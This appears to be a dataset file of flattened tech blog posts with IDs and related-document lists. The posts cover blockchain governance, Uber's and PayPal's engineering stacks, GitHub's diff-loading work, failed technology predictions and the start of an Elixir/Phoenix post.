scratch,"[1297 1192 830 92 361 251 1351 520 36 500 204]"
1299,training-dataset/business/1189.txt,business,Blockchain and the new face of decentralizationThis post was co authored with Griffin Anderson  founder of Blockchain as a Platform   Decentralization is a key theme in the shift from pipes to platforms  Pipe businesses relied on a centralized model of value creation and exchange  The model was built around a supply chain that they one or managed through contracts  Platforms decentralized the value creation and exchange   Today s platforms  Uber  Airbnb  Etsy  and others  all have one thing in common  they are scaled intermediaries that operate a decentralized model of value creation and exchange  Their exchange is considered decentralized because both the supply and demand side are directly controlled by the platform operator  For example  Uber operates a decentralized transportation exchange  The exchange was once controlled by the taxi industry  through the issuance of licenses and capital expenditure requirements  These prerequisites limited the number of taxi drivers available in a given city and thus limited supply side  By limiting supply side  the taxi industry controlled the exchange of rides in a given city  making it very difficult for anyone to become a taxi driver  Uber decentralized the supply side  by allowing any driver the opportunity to drive and serve travelers   Despite the fact that Uber s exchange is decentralized  Uber still exercises significant control over the platform  This is because Uber owns the identity of its participants  the transportation logistics  the payment mechanisms  the pricing  and the rules that govern the marketplace  More importantly  Uber   as a central intermediary   manages both the openness of the platform to its participants and the governance of their participation  As an intermediary  Uber poses all the threats that traditional intermediaries have posed while managing and regulating markets   This is why the blockchain could create a whole new model of platform intermediation   The blockchain has many definitions but there are two key aspects that make it of particular interest for the future of governance  First  it leverages a peer to peer network to govern transactions and interactions across a distributed community  Second  it manages this governance through a decentralized ledger that benefits from having a distributed computing infrastructure and a common protocol making it nearly impossible to create a fraudulent transaction   Intermediaries and the risks they carry  Historically  intermediaries such as banks  financial institutions  governments  policy makers  and corporations filled the role of the trusted advisor  They operated a set of protocols that provided a layer of trust  on which all commerce could operate  Intermediaries were a necessary outcome of moving from a local market economy to an industrial economy run by capital  While intermediaries worked to increase trust and reliability in the functioning of markets  history is filled with disasters where the intermediary injected doubt and mistrust into the system  One such disaster was the 08  financial crisis   As platforms transform the economy  we re seeing massive consolidation in markets where platforms benefit from winner take all  Not all markets show these characteristics but we ve seen several platforms benefit from this at national and global scales over the last decade  As these platforms scale their role as intermediaries  they often extend their function in ways that may harm the ecosystem that relies on them  Last fall  we saw Uber increase its commission from 20  to 25  hurting the income of black cab drivers Forbes  Without debating the merits of the change  the move did reveal the hidden risks of relying on platform intermediaries   Blockchain based models of governance  Blockchain startups all over the world are trying to address this risk  The blockchain provides the ability to codify any piece of software and deploy it on top of itself  This includes the ability to codify all the roles and functions that an intermediary has historically performed  The code is then deployed across many distributed computers and with a high level of certainty  we can assume the code will execute in the same way every time  This unique architecture makes the blockchain very suitable to create an alternate model of platform governance  Today s blockchain startups take the foundational building blocks required to build a platform and decentralize them  Building blocks such as identity  governance  banking  credit  data  and payments are being re imagined and codified on the blockchain  These are early days but distributed technologies like the blockchain could signal a shift towards decentralized intermediaries   TWEETABLE TAKEAWAYS  Blockchain and the new face of decentralization Share this  How the blockchain will change governance of today s systems Share this  The transformative power of the blockchain lies in decentralization of governance Share this,"[1299 1106 1086 1016 281 952 673 843 1300 809 572]"
1300,training-dataset/engineering/533.txt,engineering,The Uber Engineering Tech Stack  Part II  The Edge and Beyondby Lucie Lozinski  Uber Engineering  Uber s mission is transportation as reliable as running water  everywhere  for everyone  Last time  we talked about the foundation that powers Uber Engineering  Now  we ll explore the parts of the stack that face riders and drivers  starting with the world of Marketplace and moving up the stack through web and mobile   Middle  Marketplace  Marketplace  the frontmost end of the Uber engine  funnels the real world  real time requests and locations into the engineering chutes and ladders of Uber  The persistence layer  matching system  and real time transaction pieces live here  It also houses much of the logic for products like UberRUSH and UberEATS  Marketplace has the highest availability requirements at Uber   To understand Marketplace  it s important to remember the flexible influence all parts of Uber Engineering have on each other  The infrastructure at the bottom supports everything above it  but direction and features from the very top trickle down into the base  Marketplace builds for itself  but its technologies get picked up by layers above and below   Marketplace has a mini Uber stack  as do many other teams at Uber  Within Marketplace itself  engineers build infrastructure and data solutions just for Marketplace  There s a data team  an integrations team  front end engineers  backend engineers  and services written in all four of our programming languages  Python  Node  Go  Java   This tiered set of systems ensures that Uber is highly available and largely immune to failure   Uber s core trip execution engine was originally written in Node js because of its asynchronous primitives and simple  single threaded processing   In fact  we were one of the first two companies to deploy Node js in production   Node js gives us the ability to manage large quantities of concurrent connections  We ve now written many services in Go  and this number continues to increase  We like Go for its concurrency  efficiency  and type safe operations   The Edge  The frontline API for our mobile apps consists of over 600 stateless endpoints that join together multiple services  It routes incoming requests from our mobile clients to other APIs or services  It s all written in Node js  except at the edge  where our NGINX front end does SSL termination and some authentication  The NGINX front end also proxies to our frontline API through an HAProxy load balancer   This part of Marketplace integrates with a number of internal infrastructure initiatives  Engineers on this team use the open source module logtron to log to disk and Kafka  We generate stats using the uber statsd client module  the Node js client for statsd   which talks to our in house M3  previously described    Highly Available  Self Healing  Persistent  Having to support the highest availability demands  the Marketplace stack must receive and execute in real time  Even brief interruptions in this area have major consequences for our users and our business  Much of Marketplace s stack was built by and for Marketplace engineers first   Ringpop  a library for building cooperative distributed systems  solved some of Marketplace s problems before its adoption in other teams at Uber and beyond  It gives the high availability  partition tolerant properties of distributed databases like DynamoDB or Riak to developers at the application level   The systems that handle pings from riders and drivers in real time and then match them are written in Node js and Go  These teams use Ringpop and Sevnup for cooperation and shifting of object ownership when a node in a hashring goes down  or when another node takes ownership of the keyspace  Riak is their distributed database  Redis provides caching   Speed and Throughput  The engineers who build cross functional tools for adoption across the organization use Cassandra and Go more heavily than other teams at Uber  the main reason being speed  Cassandra scales well out of the box  and Go compiles extremely fast   Throughput is also crucial for Marketplace teams  They must be able to handle the largest quantities of traffic  since all requests go through Marketplace  Inundated with queries on our busiest nights of the year  Marketplace systems must take the hit  otherwise  requests don t even get the chance to hit other parts of Uber   Optimizing and Balancing  Marketplace teams control optimization and balance through dynamic pricing  supply positioning  intelligent matching  and health  Much of this stack was built in Python with Flask and uWSGI  but we re rewriting most Python with Go for higher performance  Blocks on network calls and I O slowed our services in weird ways  requiring more capacity and services provisioned to get the same request throughput  Python was useful for talking to a MySQL back end  but we move away from the MySQL primary secondary setup with every Riak and Cassandra cluster   Seeing and Using Data  A group within Marketplace turns Marketplace data into useful visualizations to help the team understand and observe the state of the world  We use JavaScript for web front end applications  React Flux  D3  and Mapbox are the libraries and frameworks behind this group  For the back end  it s the same Node js server used by Uber s web engineers   Data engineers within Marketplace use a flow of databases  homegrown solutions  and open external technologies for data processing  streaming  querying  machine learning  and graph processing   For data streaming  we use Kafka and Uber s production databases  Hive  MapReduce  HDFS  Elasticsearch  and file storage web services all contribute to the purposeful data storage and operations we perform  We developed a different kind of LIDAR from what you re used to  The Ledger of Interactive Data Analysis Records  only shared internally for now  runs JupyterHub for multiuser Jupyter  IPython  Notebooks  integrated with Apache Spark and our data platform  Marketplace Data works independently from the Data Engineering team  but much of their stacks overlap   Above Marketplace  the web and mobile sides are a different world   Top  Web and Mobile  Our web and mobile engineers share many elements with the lower parts of the stack  but many technologies are unique to the top  Engineers along these branches build the app you know  along with libraries and frameworks for all web and mobile engineers to use  Teams in this part of the org prioritize user experience and accessibility   Web  Web and product teams collaborate to create and promote modular  separately deployed web apps with shared user interfaces and a unified user experience   Languages  The core of our web tech stack is built on top of Node js  which has a large and vibrant community of web engineers  Node js allows us to share JavaScript code between client and server to create universal  isomorphic  web applications  We use Browserify for our client side bundling because of its Node js style module requirements   Web Server  Our base web server  Bedrock  is built on top of the widely popular web framework Express js  which has a set of default middleware to provide security  internationalization  and other Uber specific pieces that handle infrastructure integration   Our in house service communication layer  Atreyu  handles communication with backend services and integrates with Bedrock  Atreyu lets us make requests to our SOA service APIs easily  similar to Falcor or Relay   Rendering  State Handling  and Building  We use React js and standard Flux for our application rendering and state handling  though a few teams have been experimenting with Redux as our future state container  We are also migrating our existing OOCSS BEM style CSS toolkit  called Superfine  into a set of CSS encapsulated React js UI components built using style objects think Radium   Our build system  Core Tasks  is a standard set of scripts to compile and version front end assets  created on top of Gulp js  that publishes to the file storage web service  allowing us to take advantage of a CDN service   Finally  we use an internal NPM registry to access the huge collection of public registry packages as well as publish internal only packages  Any engineer can publish to it  which lets us share modules and React js components between teams with ease   Mobile  Uber once had a strictly mobile org  Now  we have a cross functional organization for what we call program teams  Each interdisciplinary program team has members from back end to design and data science   Languages  Uber s iOS engineers  as expected  write in Objective C and Swift  while Android engineers write in Java  Some work with React components as well  Swift enables more static analysis and compile time safety  it makes it more difficult to write incorrect code  We re excited about protocol oriented programming  We re moving toward a modular library based system in mobile   Libraries  At these top branches  we use third party libraries or build our own to fit specific needs  Many open source libraries available are general purpose  which can create binary bloat  For mobile engineering  every kilobyte matters   Android  On the Android side  Gradle is our build system  We use OkHttp  Retrofit  and Gson for networking  Dagger is our dependency injection framework   We use open source libraries to keep our UI code concise and easy  Butter Knife lets us bind views and callbacks to fields and methods via annotation processing  Picasso provides image loading   The Espresso extension enables us to write a lot of native automation code using familiar Android SDKs within the IDE  we use Android Studio   Regarding architecture  we use RxJava to simplify how we do asynchronous and event based programming  For logging  we use Timber   iOS  All of our iOS code lives in a monorepo that we build with Buck  Masonry and SnapKit with Auto Layout help with component placement and sizing  For crash detection  we use KSCrash and report the crashes using our internal reporting framework  For testing in Objective C  we use OCMock to mock and stub classes  For testing in Swift  we generate mocks via protocols   Storage  For storage  we use LevelDB  On the back end  we use the standard Schemaless and MySQL  gradually moving toward all Schemaless   Development  We have four primary apps  Android rider  Android driver  iOS rider  and iOS driver  That means that hundreds of engineers on each platform land code into a monolithic code base that ships once a week  and we have no ability to roll out quickly if anything goes wrong  Instead  we have to build systems to make this type of development reliable   Mobile development is one hundred percent trunk development and train releases  We still use Git to store our software versions over time  but all engineers working on the apps commit directly to master  So many people branching and landing creates too much risk  Instead  we use an in house service and application configuration platform that s easy to use and build on top of  enabling stakeholders to effect change in Uber s services and businesses  The platform uses feature flags to enable and disable code pass from the server side  We launch dark  turn it on  and monitor the rollout closely   Engineers don t need to think about the build train  they just land incrementally behind the feature flag  Rather than a manual QA process  we invest heavily in automation and monitoring  Our continuous integration and enforcement keeps us scaling fast  and monitoring lets auto responsive systems catch and correct any flawed commits   Stacks on Stacks on Stacks  Part of what makes Uber s tech stack difficult to cover is that there s no definitive set of rules  When many people think of a tech stack  they picture one totem pole  with the infrastructure at the ground and the user facing feature tools at the top  There are clear layers and boundaries   Uber  however  has microcosms of a full stack at almost every level mobile feature teams have front end and backend engineers working together  and teams choose whichever data storage solutions best meet a project s unique needs  Some teams  like Money in finance engineering  which we ll cover in its own article   have stacks that warrant standalone explanations   Overall  what makes our work interesting is not the stack we use  it s operating with great speed at scale as we handle real life transactions in real time  The technologies that make Uber happen are subject to change  Our speed  flexibility  sense of urgency  and drive to overcome challenges will persist  Sound fun  Join us   Also see  The Uber Engineering Tech Stack  Part I  The Foundation  Photo Credit   Chapman s Baobab  by Conor Myhrvold  Botswana   Header Explanation  Baobab trees are renowned for their resilience  longevity  and thick trunk and branches  Chapman s Baobab in the Kalahari desert is one of Africa s oldest trees   Correction  Tuesday  August 2  2016  An earlier version of this article referred incorrectly to mobile tools and libraries  We use Masonry  not Mantle  for layout  We also updated the section with a more accurate overview of our mobile stack,"[1300 673 281 1016 1086 778 952 1010 1399 1351 733]"
1309,training-dataset/engineering/355.txt,engineering,squbs  A New  Reactive Way for PayPal to Build ApplicationsPreface  It is not uncommon for services in PayPal to cover 1000 VMs or more  These services make use of very small VMs and produce very low throughput for each VM  At the same time  the large number of nodes takes a toll on the network and routing infrastructure  Several of these services are interconnected into a complicated mesh  making a user request travel through many network hops  As the number of these services adds up  latency gradually increases and the user experience deteriorates   While it is good for a service to have a critical mass of VMs spread across many data centers for redundancy  additional VMs beyond the critical mass have diminishing returns  There is an inherent cost to too many services spanning hundreds of VMs  in terms of management and monitoring  ineffective caching  but more importantly in terms of agility  It may take from a few minutes  up to an hour to roll out a new version of the service across 100 VMs  It takes ten times longer to roll out 1000 VMs   We have been riding the single thread performance increases of Moore s law for many decades now  but the trends slowed down since about 2005  Unless there are breakthroughs in alternate technologies like quantum computing  we are at the limit of transistor density and clock speed  This means newer processors do not necessarily make your single threaded applications run faster any longer  The trend on power savings drove the microprocessor industry to provide more processors at lower clock speeds  This now means applications will have to adapt to making use of more CPUs per VM   The industry cries  micro services  out loud  But what are micro services  When would a service be considered a micro service  When would it become a nano service   And how will engineers and organizations know what the right service boundary is  We heard that micro services are services that do only one thing  Does this mean if an organization does ten thousand things we need to have ten thousand services  Perhaps  The truth is  services grow organically and are aligned more with organizations than with their function in the grand scheme  A re org splits an engineering team into two and  quite often  the one service owned by that team is now split into two services  This means even micro services should be structured to be modular and be able to adapt to organizational re structuring  In essence  you may want a micro service to be built upon a multitude of these loosely coupled nano services   Lastly  even our micro services or nano services get complicated and hard to maintain  We need modern programming techniques that allow us to quickly build and assemble these services  Ideally  there should be good visibility into that one thing a service does and you should not have to dig into layers and layers of code to figure it out   These set of problems and requirements drive us to look for a next generation framework or infrastructure  and include   Scalable  both horizontally to hundreds of nodes and vertically to very many processors  handling billions of requests per day Low latency  controllable at a very fine grain Resilient to failure Flexibility in adjusting the service boundaries A programming model AND culture encouraging scalability and simplicity  including clean failure and error handling  Based on these requirements  we quickly narrowed down our options and turned to the Actor Model of Computation for its ultimate scalability  Being a message based system also allows us to control latency at very good granularity as opposed to deeply stack based systems  There are two prominent players  Erlang and Akka  Erlang has some very prominent properties  especially the runtime upgradability  and can be a good choice  But PayPal already has a significant investment in the Java Virtual Machine  JVM   Growing a new stack from scratch in this environment is extremely difficult with its many operational hooks and security requirements  Having many of these hooks ready as JVM libraries  for good or worse  does significantly help with cost and time to market  Therefore  we decided to use Akka and Spray as the http library as it fully honors the Akka actor and execution model   The unique mix of functional programming and the actor model in Akka  and definitely Erlang  too  allowed us to write code that is easy to reason about  easy to test  and especially easy to handle errors and failure scenarios when compared to the traditional model used on the JVM  This is a great benefit allowing faster  resilient  and simpler code with streamlined error handling and fewer bugs   Because Akka and Spray are in the form of libraries and provide the ultimate flexibility to whatever you want to build  it unfortunately allows every service to build their ecosystem from scratch  This would lack standardization and manageability across many of these services we want to grow  causing these services to only become  specialty  services  each with its own way of deployment and management  We looked at Play as an alternative  While it is extremely simple  it did not natively follow the Akka message based APIs and conventions but rather allow the use of Akka on top of Play   A Mini Introduction to squbs  A new stack called  squbs  spelled in all lower case with the pronunciation rhyming with  cubes   makes use of the loose coupling already provided by actors  It creates a modular layer  for your nano services  called  cubes  that are symmetric to other cubes  Unlike libraries with concrete dependencies at the API layers  cubes ride on the actor system and only expose the messaging interface already provided in Akka  The interdependency between cubes are loose and symmetric  It is not hard to see the roots of the name  squbs  from these concepts and properties   There are only a few principles coming together for designing squbs   It must be extremely lightweight with no measurable performance deficit over a similar Akka application built from scratch  New APIs over the Akka APIs are based on absolute necessity  Developers should not need to learn any squbs API or message protocol to build services or applications on squbs  The knowledge base needed to build squbs applications should be the Akka knowledge base which developers can acquire from training  documentation  and forums available on the Internet  It should be open source from the core up  with hooks for plugging in PayPal operationalization that cannot be open sourced   With this  squbs became the standard for building Akka based reactive applications  PayPal   Culture   Language  Programming to the reactive  functional landscape is very different from the traditional Java programming we have done for the last 20 years  It requires immutability  leaving behind Java Beans and nulls and most mutable APIs in the Java ecosystem  adopting error containers like the Scala Try  a Java version is available in open source   and an ultimate awareness of dangerous function closing overs and any blocking behavior   While squbs supports both Scala and Java use cases  Akka APIs are clearly more suitable to their native Scala ecosystem  We also debate whether it is easier for an engineering team with Java background to stay with Java and adopt a culture very different from how we have programmed Java for the last 20 years  empirical programming with pervasive mutability  and try to set our own culture  standards  and guidelines against what Java programmers are used to do  or have them learn Scala and adopt the pre existing Scala culture well suited for this programming model  with a lot of support libraries that are readily immutable and functional   The culture adoption is hard to describe  Before teams get their hands dirty  the ultimate answer was almost always Java  It should not be to any surprise as it is their bread and butter language  There is also a resistance from management and architects that do not get their hands dirty  It is the resistance to any change  a resistance to do what you know and not go beyond  Any such change is perceived to introduce a tremendous risk to their projects   in many cases not even knowing they are already trying to create a sub culture just under the Java brand name   a set of people who speak Java in a very different dialect and will have to maintain this functional  reactive dialect of Java in each of their teams   For teams and members that actually do get this far and get their sleeves rolled up  they tend to see very quickly their work is much easier when using Akka s native tongue  Scala  The libraries  the culture  and all they need is readily available  It feels natural  with no tweaks  Also  learning Scala to the point of building reactive services is barely scratching the surface of the ocean depths of Scala   Programming Patterns  How do you take a programmer who only knows how to write linear code  and make them build high performance  actor based systems  Since we do not have the luxury to hire the top 5  ubercoders  we have to make sure our developers can be trained to do the job   Luckily  a vast majority of services do similar things  They receive requests or messages  make database calls to read write the database  make other service calls  call a rule engine  fetch data from cache  write to cache  all in combination  Here goes our micro service that does one thing  Some others have one or other forms of stream processing  sometimes ETL   Because it is useful to create some common patterns that teams can readily adopt  we defined and built our set of programming patterns  which over time  will manifest as application templates  It allows for developers to see the problem and marry it to a well defined and well studied pattern ensuring short term success to their projects   A common pattern is the  Orchestrator Pattern  which orchestrates requests or messages by talking to a multitude of resources  all asynchronously  These resources may be in the same system  with a manifestation as an actor  another cube which just happens to be on the same address space  or a remote resource altogether   Another trait we have is graciously called the  Perpetual Stream   It is no different from just Akka Streams  except that it encourages very long running streams that will start with the service and stop when the service instance gets stopped  Providing this pattern and utility in squbs allows for streams to hook into the system state and ensure no messages are dropped at shutdown  It provides an additional benefit of modeling the whole flow of the service in a central place  providing a clear oversight and understanding of the service s functionality   Results  The adoption of Akka and squbs have already provided very high scale results  With as little as 8 VMs and 2 vCPU each  applications were able to serve over a billion hits a day  Our systems stay responsive even at 90  CPU  very uncharacteristic for our older architectures  This provides for transaction densities never seen before  Batches or micro batches do their jobs in one tenth of the time it took before  With wider adoption  we will see this kind of technology being able to reduce cost and allow for much better organizational growth without growing the compute infrastructure accordingly   Needless to say  Akka and squbs are still players at the  infrastructure  level  squbs is an open source project by eBay and PayPal  It was designed to be open sourced from the very beginning and is free from pollution and deep library dependencies  We believe the customization hooks allow squbs to fit into any operational environment and would benefit any organization who wants to adopt Akka based technologies in a larger scale   Visit us at https   github com paypal squbs and leave your comments and questions on the Gitter channel you find on this github site,"[1309 886 1351 92 673 276 778 61 695 234 278]"
1323,training-dataset/business/435.txt,business,Modesty  First Principles and Opportunities for StartupsModesty  First Principles and Opportunities for Startups  I met a physicist this week who told me all the Nobel laureates he had met in his studies have been the most modest of physicists   They realize how small they are in the world  after discovering something incredibly special and new   Separately  I referenced an executive this week  A former colleague of this person told me   this is not a person who sees a model work once or twice  and instantly subscribes to the notion that it will work every time for every business    Those two conversations have me thinking about first principles thinking and modesty  They go hand in hand  To approach a problem with first principles  you have to set aside what you ve learned about the problem or preconceived notions you might have  You have to tell yourself you know nothing about space or the business problem  Then  you have to become a student again  and learn as if it was the first time   This is how we discover secrets  the startup kind   the ideas you believe that very few others do  Opportunities to disrupt appear when a fundamental assumption about the world changes  For decades  data storage and compute was expensive  But today  it s cheap and hugely scalable  Legacy business intelligence vendors predicated their systems architecture on expensive data stores  Today  that is no longer true and a new architecture that leverages these database advances is better  That s Looker s opportunity   Several years ago  I heard Elon Musk speak at the D conference  When asked how he started SpaceX  he related the story about how he couldn t believe it was so expensive to launch a rocket  So he and his team began a bottoms up cost exercise to see exactly how much it would cost if they dated today  The carbon fiber  the titanium  the fuel  the constituent parts of rocket  totaled only 2  of the current per rocket cost  Musk and his team discovered a that a fundamental assumption in the world of space was no longer true  It doesn t cost that much to launch a rocket   There are many other examples of this  SaaS  Can software be sold over the Internet  Cloud infrastructure  Which enterprise will push all of their data on someone else s servers  In all of these cases  entrepreneurs identified and believed that a fundamental assumption in the market had changed  And they seized the opportunity   Identifying these dislocations in market dynamics requires modesty and first principles  When market dislocations happen  the approaches that worked in the past won t work in the future  Asking the critical questions about the implications of these changes enables us to hypothesize about to address the market in its new state   Published 2017 02 03 in Startups,"[1323 1373 794 61 1403 830 809 778 695 1336 234]"
1326,training-dataset/engineering/690.txt,engineering,How we made diff pages three times fasterWe serve a lot of diffs here at GitHub  Because it is computationally expensive to generate and display a diff  we ve traditionally had to apply some very conservative limits on what gets loaded  We knew we could do better  and we set out to do so   Historical approach and problems  Before this change  we fetched diffs by asking Git for the diff between two commit objects  We would then parse the output  checking it against the various limits we had in place  At the time they were as follows   Up to 300 files in total   Up to 100KB of diff text per file   Up to 1MB of diff text overall   Up to 3 000 lines of diff text per file   Up to 20 000 lines of diff text overall   An overall RPC timeout of up to eight seconds  though in some places it would be adjusted to fit within the remaining time allotted to the request   These limits were in place to both prevent excessive load on the file servers  as well as prevent the browser s DOM from growing too large and making the web page less responsive   In practice  our limits did a pretty good job of protecting our servers and users  web browsers from being overloaded  But because these limits were applied in the order Git handed us back the diff text  it was possible for a diff to be truncated before we reached the interesting parts  Unfortunately  users had to fall back to command line tools to see their changes in these cases   Finally  we had timeouts happening far more frequently than we liked  Regardless of the size of the requested diff  we shouldn t force the user to wait up to eight seconds before responding  and even then occasionally with an error message   Our Goals  Our main goal was to improve the user experience around  re viewing diffs on GitHub   Allow users to  re view the changes that matter  rather than just whatever appears before the diff is truncated   Reduce request timeouts due to very large diffs   Pave the way for previously inaccessible optimizations  e g  avoid loading suppressed diffs    Reduce unnecessary load on GitHub s storage infrastructure   Improve accuracy of diff statistics   A new approach  To achieve the aforementioned goals  we had to come up with a new and better approach to handling large diffs  We wanted a solution that would allow us to get a high level overview of all changes in a diff  and then load the patch texts for the individual changed files  progressively   These discrete sections could later be assembled by the user s browser   But to achieve this without disrupting the user experience  our new solution also needed to be flexible enough to load and display diffs identically to how we were doing it in production to date  We wanted to verify accuracy and monitor any performance impact by running the old and new diff loading strategies in production  side by side  before changing to the new progressive loading strategy   Lucky for us  Git provides an excellent plumbing command called git diff tree    Diff  table of contents  with git diff tree  git diff tree is a low level  plumbing  git command that can be used to compare the contents of two tree objects and output the comparison result in different ways   The default output format is   raw   which prints a list of changed files     git diff tree   raw  r   find renames HEAD  HEAD  100644 100644 257cc5642cb1a054f08cc83f2d943e56fd3ebe99 441624ae5d2a2cd192aab3ad25d3772e428d4926 M fileA  100644 100644 5716ca5987cbf97d6bb54920bea6adde242d87e6 4ea306ce50a800061eaa6cd1654968900911e891 M fileB  100644 100644 7c4ede99d4fefc414a3f7d21ecaba1cbad40076b fb3f68e3ca24b2daf1a0575d08cd6fe993c3f287 M fileC  Using git diff tree   raw we could determine what changed at a high level very quickly  without the overhead of generating patch text  We could then later paginate through this list of changes  or  deltas   and load the exact patch data for each  page  by specifying a subset of the deltas  paths to git diff tree   patch    To better understand the obvious performance overhead of calling two git commands instead of one  and to ensure that we wouldn t cause any regressions in the returned data  we initially focused on generating the same output as a plain call to git diff tree   patch   by calling git diff tree   raw and then feeding all returned paths back into git diff tree   patch    We started a Scientist experiment which ran both algorithms in parallel  comparing accuracy and timing  This gave us detailed information on cases where results were not as expected  and allowed us to keep an eye on performance   As expected  our new algorithm  which was replacing something that hadn t been materially refactored in years  had many mismatches and performance was worse than before   Most of the issues that we found were simply unexpected behaviors of the old code under certain conditions  We meticulously emulated these corner cases  until we were left only with mismatches related to rename detection in git diff    Fetching diff text with git diff pairs  Loading the patch text from a set of deltas sounds like it should have been a pretty straightforward operation  We had the list of paths that changed  and just needed to look up the patch texts for these paths  What could possibly go wrong   In our first attempt we loaded the diffs by passing the first 300 paths from our deltas to git diff tree   patch   This emulated our existing behaviour    and we unexpectedly ran into rare mismatches  Curiously  these mismatches were all related to renames  but only when multiple files containing the same or very similar contents got renamed in the same diff   This happened because rename detection in git is based on the contents of the tree that it is operating on  and by looking at only a subset of the original tree  git s rename detection was failing to match renames as expected   To preserve the rename associations from the initial git diff tree   raw run   peff added a git diff pairs command to our fork of Git  Provided a set of blob object IDs  provided by the deltas  it returns the corresponding diff text  exactly what we needed   On a high level  the process for generating a diff in Git is as follows   Do a tree wide diff  generating modified pairs  or added deleted paths  which are just considered pairs with a null before after state   Run various algorithms on the whole set of pairs  like rename detection  This is just linking up adds and deletes of similar content  For each pair  output it in the appropriate format  we re interested in   patch   obviously    git diff pairs lets you take the output from step 2  and feed it individually into step 3   With this new function in place  we were finally able to get our performance and accuracy to a point where we could transparently switch to this new diff method without negative user impact   If you re interested in viewing or contributing to the source for git diff pairs we submitted it upstream here   Change statistics with git diff tree   numstat   shortstat  GitHub displays line change statistics for both the entire diff and each delta  Generating the line change statistics for a diff can be a very costly operation  depending on the size and contents of the diff  However  it is very useful to have summary statistics on a diff at a glance so that the user can have a good overview of the changes involved   Historically we counted the changes in the patch text as we processed it so that only one diff operation would need to run to display a diff  This operation and its results were cached so performance was optimal  However  in the case of truncated diffs there were changes that were never seen and therefore not included in these statistics  This was done to give us better performance at the cost of slightly inaccurate total counts for large diffs   With our move to progressive diffs  it would become increasingly likely that we would only ever be looking at a part of the diff at any one time so the counts would be inaccurate most of the time instead of rarely   To address this problem we decided to collect the statistics for the entire diff using git diff tree   numstat   shortstat   This would not only solve the problem of dealing with partial diffs  but also make the counts accurate in cases where they would have been incorrect before   The downside of this change is that Git was now potentially running the entire diff twice  We determined this was acceptable  however as the remaining diff processing for presentation was far more resource intensive  Also  with progressive diffs  it was entirely probable that many larger diffs would never have the second pass since those deltas might never be loaded anyway   Due to the nature of how git diff tree works  we were even able to combine the call for these statistics with the call for deltas into a single command  to further improve performance  This is because Git already needed to perform a full diff in order to determine what the statistics were  so having it also print the tree diff information is essentially free   Patches in batches  a whole new diff  For the initial request of a page containing a diff  we first fetched the deltas along with the diff statistics  Next we fetched as much diff text as we could  but with significantly reduced limits compared to before   To determine optimal limits  we turned to some of our copious internal metrics  We wanted results as quickly as possible  but we also wanted a solution which would display the full diff in  most  cases  Some of the information our metrics revealed was   81  of viewed diffs contain changes to fewer than ten files   52  of viewed diffs contain only changes to one or two files   80  of viewed diffs have fewer than 20KB of patch text   90  of viewed diffs have fewer than 1000 lines of patch text   From these  it was clear a great number of diffs only involved a handful of changes  If we set our new limits with these metrics in mind  we could continue to be very fast in most cases while significantly improving performance in previously slow or inaccessible diffs   In the end  we settled on the following for the initial request for a diff page   Up to 400 lines of diff text   Up to 20KB of diff text   A request cycle dependent timeout   A maximum individual patch size of 400 lines or 20KB   This allowed the initial request for a large diff to be much faster  and the rest of the diff to automatically load after the first batch of patches was already rendered   After one of the limits on patch text was reached during asynchronous batch loading  we simply render the deltas without their diff text and a  load diff  button to retrieve the patch as needed   Overall  the effective limits we enforce for the entire diff became   Up to 3 000 files   Up to 60 000 000 lines  not loaded automatically    Up to 3GB of diff text  also not loaded automatically    With these changes  you got more of the diff you needed in less time than ever before  Of course  viewing a 60 000 000 line diff would require the user to press the  load diff  button more than a couple thousand times   The benefits to this approach were a clear win  The number of diff timeouts dropped almost immediately   Additionally  the higher percentile performance of our main diffs pages improved by nearly 3x   Our diff pages pages were traditionally among our worst performing  so the performance win was even noticeable on our high percentile graph for overall requests  performance across the entire site  shaving off around 3 5s from the 99 9th percentile   Looking to the future  This new approach opens the door to new types of optimizations and interface ideas that weren t possible before  We ll be continuing to improve how we fetch and render diffs  making them more useful and responsive,"[1008 1326 683 895 579 550 778 713 1351 1336 1399]"
1328,training-dataset/business/195.txt,business,Technology predictionsSome of these are probably apocryphal  but making predictions about the limits of technology is really hard       Space travel is utter bilge         Computers in the future may   perhaps only weigh 1 5 tons     Popular Mechanics  1949  X rays are a hoax       Lord Kelvin  ca  1900    I confess that in 1901 I said to my brother Orville that man would not fly for fifty years  Two years later we ourselves made flights  This demonstration of my impotence as a prophet gave me such a shock that ever since I have distrusted myself and avoided all predictions         To place a man in a multi stage rocket and project him into the controlling gravitational field of the moon where the passengers can make scientific observations  perhaps land alive  and then return to earth  all that constitutes a wild dream worthy of Jules Verne  I am bold enough to say that such a man made voyage will never occur regardless of all future advances       Lee deForest  inventor of the vacuum tube  1957  There is not the slightest indication that  nuclear energy  will ever be obtainable  It would mean that the atom would have to be shattered at will       Albert Einstein  1932  That is the biggest fool thing we have ever done  The bomb will never go off  and I speak as an expert in explosives         Anyone who expects a source of power from the transformation of these atoms is talking moonshine           Ernest Rutherford  1933        The abolishment of pain in surgery is a chimera  It is absurd to go on seeking it    Knife and pain are two words in surgery that must forever be associated in the consciousness of the patient       Dr  Alfred Velpeaum  French surgeon  1839  Bitcoin is definitely going to be trading at  10 000 or more and in wide use by the end of 2014     Many otherwise smart people  November of 2013  Superhuman machine intelligence is prima facie ridiculous       Many otherwise smart people  2015       Most of these from  https   www lhup edu  dsimanek neverwrk htm,"[1328 1323 134 778 251 1086 61 281 1373 641 1138]"
1335,training-dataset/engineering/258.txt,engineering,The Future of Web APIs and Apps Elixir and Phoenix  The Future of Web APIs and Apps  Posted on 19th April 2016 by Christian Nelson in Development  Elixir  Buzz has been building up around Elixir  and Phoenix  in the development community over the last year  We re pretty excited about them too and want to share the reasons why they ve piqued our interest and what we ve learned so far   We decided to kick the tires by rewriting one of our in house web applications using Elixir and Phoenix so that we could answer the questions that are most front of mind   How productive is the stack   Are there any emergent benefits   Are there any significant gotchas   What are the performance characteristics   What s the community like   What s important   First  let s talk a little bit about what we re looking for in any tech stack and why  Ultimately  we want to build using tech that s highly productive and doesn t make it difficult to adapt or grow as products mature and become more sophisticated  That is  we want to be able to be productive in the short   medium  and long term  We define productivity as being able to get features in front of users quickly  It s influenced by the language  the frameworks and libraries  the development toolchain  and the services that make development and deployment easier  We also want to be a part of a community that s welcoming  inclusive  supportive and generally positive   Why is productivity so important to us   We re in the business of building products in such a way that tightens the feedback loop  so that we re validating assumptions and course correcting early and as often as necessary  We love tech  but what we love more is building the right product  and that almost never happens on the first swing  That s why productivity and quick iteration are so important  Practically every decision we make is made with this in mind   It s this quest for productivity that drove us away from Java EJBs to the lighter  faster  better Java stack of Spring  Hibernate  and Tomcat around 2005  Then it drove us to Ruby on Rails around 2008  